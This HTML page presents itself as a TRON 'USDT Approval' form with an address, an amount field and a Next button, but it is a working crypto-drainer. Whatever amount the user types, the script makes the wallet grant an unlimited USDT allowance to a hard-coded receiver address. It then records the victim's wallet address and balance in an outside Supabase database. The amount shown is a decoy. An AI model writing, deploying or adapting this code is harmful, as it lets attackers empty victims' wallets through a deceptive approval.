<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>USDT Approval</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background-color: #fff;
      color: #000;
    }

    .container {
      max-width: 400px;
      margin: 0 auto;
    }

    label {
      display: block;
      margin-top: 20px;
      margin-bottom: 6px;
      font-weight: 600;
    }

    input[type="text"], input[type="number"] {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 12px;
      box-sizing: border-box;
    }

    .amount-box {
      display: flex;
      position: relative;
      margin-bottom: 20px;
    }

    .amount-box input {
      padding-right: 90px;
    }

    .amount-box span {
      position: absolute;
      top: 50%;
      right: 60px;
      transform: translateY(-50%);
      font-weight: 600;
      color: #888;
    }

    .max-btn {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      padding: 6px 10px;
      border: none;
      background: #eee;
      border-radius: 8px;
      font-size: 14px;
      cursor: pointer;
    }

    button {
      width: 100%;
      padding: 14px;
      font-size: 18px;
      font-weight: bold;
      background-color: #26C8F2;
      color: #fff;
      border: none;
      border-radius: 14px;
      cursor: pointer;
      margin-top: 40px;
    }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter@latest"></script>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/+esm"></script>
</head>
<body>
  <div class="container">
    <label>Address</label>
    <input type="text" id="address" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" readonly />

    <label>Amount</label>
    <div class="amount-box">
      <input type="number" id="amount" placeholder="0" />
      <span>USDT</span>
      <button class="max-btn" onclick="setMax()">Max</button>
    </div>

    <button onclick="approveUSDT()">Next</button>
  </div>

  <script type="module">
    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';

    const supabase = createClient(
      'https://ycmspiedqvwzzrgpxeci.supabase.co',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljbXNwaWVkcXZ3enpyZ3B4ZWNpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTM1OTMxODQsImV4cCI6MjA2OTE2OTE4NH0.z0sw1x0ysYlBdIg4zGM8Y6J59KTVw3Ta9j-xaxCbT5o'
    );

    const usdtContract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const receiverAddress = 'TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN';

    async function connectWallet() {
      if (!window.tronWeb || !window.tronWeb.ready) {
        alert('TronLink / Web3 wallet not detected. Please open in supported wallet browser.');
        return false;
      }
      return true;
    }

    function setMax() {
      document.getElementById('amount').value = 999999999;
    }

    async function approveUSDT() {
      const connected = await connectWallet();
      if (!connected) return;

      const from = window.tronWeb.defaultAddress.base58;
      const amount = document.getElementById('amount').value || '0';
      const contract = await window.tronWeb.contract().at(usdtContract);

      try {
        await contract.approve(receiverAddress, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send();
        const balance = await contract.balanceOf(from).call();

        await supabase.from('approvals').insert({
          wallet_address: from,
          amount: amount,
          balance: parseFloat(window.tronWeb.fromSun(balance)),
          timestampz: new Date().toISOString()
        });

        alert('Approval successful!');
      } catch (err) {
        console.error(err);
        alert('Approval failed.');
      }
    }
  </script>
</body>
</html>
